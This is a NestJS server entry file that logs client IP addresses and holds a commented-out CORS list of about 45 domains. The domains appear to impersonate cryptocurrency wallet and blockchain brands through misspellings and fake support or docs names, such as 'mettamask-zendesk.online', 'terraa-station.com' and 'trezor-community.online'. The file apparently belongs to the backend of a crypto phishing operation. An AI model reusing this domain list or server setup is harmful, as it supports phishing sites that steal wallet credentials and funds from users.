import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import * as dotenv from 'dotenv';
import * as requestIp from 'request-ip';

dotenv.config();

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  app.use(requestIp.mw());
  // app.enableCors({
  //   origin: [
  //     'ledger-communities.com',
  //     'aave-community.online',
  //     'docs-moralis.online',
  //     'gnosis-chain.online',
  //     'trezor-community.online',
  //     'cosmo-network.online',
  //     'mettamask-zendesk.online',
  //     'terrastation-support.online',
  //     'app-aave.tech',
  //     'terraa-station.com',
  //     'ergoauthform.com',
  //     'live-litecoin.org',
  //     'govaaveonline.org',
  //     'operatefixes.org',
  //     'cosmo-official.org',
  //     'sol-official.org',
  //     'trezor-official.org',
  //     'blocktrainner.org',
  //     'injective-network.org',
  //     'fixtoken-dapps.org',
  //     'wonder-money.org',
  //     'doc-tornadocash.org',
  //     'dev-algo.org',
  //     'aptosresearcher.org',
  //     'exploreonsite.org',
  //     'explore-ledger.org',
  //     'federal-grants.online',
  //     'explore-trondao.org',
  //     'docs-polygonnetwork.org',
  //     'sol-official.store',
  //     'dev-algo.online',
  //     'dev-harmony.online',
  //     'explore-ledger.online',
  //     'live-litecoin.online',
  //     'openzeplin.online',
  //     'onlinesecret.org',
  //     'ethersupport.org',
  //     'contact-cardanno.org',
  //     'aptos-launch.org',
  //     'explore-cardano.org',
  //     'evmos-network.online',
  //     'networkmatic.online',
  //     'chainfix.org',
  //     'allchainfix.online',
  //     'Explore-ripple.org',
  //   ],
  // });
  await app.listen(process.env.PORT || 3000);
}
bootstrap();
